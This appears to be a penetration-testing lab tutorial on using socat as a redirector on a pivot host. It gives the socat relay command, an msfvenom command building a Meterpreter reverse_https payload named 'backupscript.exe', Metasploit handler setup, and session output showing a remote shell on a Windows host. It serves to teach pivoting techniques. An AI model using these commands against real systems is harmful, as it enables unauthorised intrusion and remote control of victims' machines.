# Playing Pong with Socat

[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that creates a pipe between two independent network channels without requiring SSH or any existing tunneling infrastructure. In a pivoting context, it acts as a standalone redirector -- traffic arriving on a port gets forwarded to any destination, making it a lightweight alternative to SSH remote port forwarding when an SSH session is not available or practical.

## How Socat Fits Into the Pivot Scenario

In previous sections, SSH was used to forward callbacks from the Windows host back to the attacker's machine. Socat accomplishes the same result differently. Instead of an encrypted tunnel carrying the relayed connection, socat opens a plain TCP listener on the pivot host and forwards any incoming traffic directly to the attacker's IP and port. The Windows payload calls back to the pivot -- where socat is listening -- and socat immediately redirects that connection onward to the Metasploit handler.

## Setting Up the Socat Redirector

On the Ubuntu pivot host, a single socat command creates the listener and configures the redirect:

```bash
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Breaking this down:
- `TCP4-LISTEN:8080` -- listen for incoming TCP connections on port 8080
- `fork` -- spawn a new process for each incoming connection, allowing multiple concurrent connections rather than handling only one and exiting
- `TCP4:10.10.14.18:80` -- forward each connection to the attacker's machine at port 80

This process runs in the foreground on the Ubuntu server. The pivot host now acts as a transparent relay between the Windows target and the attacker's listener.

## Creating the Windows Payload

The payload is configured to call back to the Ubuntu server's internal IP on port 8080 -- the port where socat is listening:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

The Windows host can reach `172.16.5.129:8080` directly since both are on the same `172.16.5.0/23` network. The Windows host has no knowledge of or route to the attacker's machine -- socat handles the redirection transparently.

## Configuring the Metasploit Listener

The handler on the attack host listens on port 80 -- the destination port configured in the socat command. Setting `lhost` to `0.0.0.0` ensures it accepts the connection arriving via the socat relay:

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
msf6 exploit(multi/handler) > run
```

## Establishing the Session

Once the payload executes on the Windows host, the Metasploit handler receives the connection appearing to originate from the Ubuntu server's IP (`10.129.202.64`) rather than the Windows host directly:

```
[*] https://0.0.0.0:80 handling request from 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1) at 2022-03-07 11:08:10 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

The session shows `127.0.0.1` as the source, consistent with previous techniques -- the traffic arrives through a local relay rather than directly from the Windows host. The `getuid` output confirms execution on the Windows target under the correct user context.

## Socat vs SSH Remote Port Forwarding

Both techniques achieve the same outcome but differ in their requirements and characteristics:

| Aspect | SSH Remote Port Forward | Socat Redirector |
|---|---|---|
| Requires SSH access to pivot | Yes | No |
| Traffic encryption | Yes, inside SSH tunnel | No, plain TCP relay |
| Setup complexity | Moderate | Minimal |
| Dependency | SSH service running | Socat binary present |
| Multiple concurrent connections | Yes | Yes, via `fork` flag |

Socat is particularly useful when SSH is unavailable, locked down, or when the goal is a quick transparent relay with minimal configuration overhead.
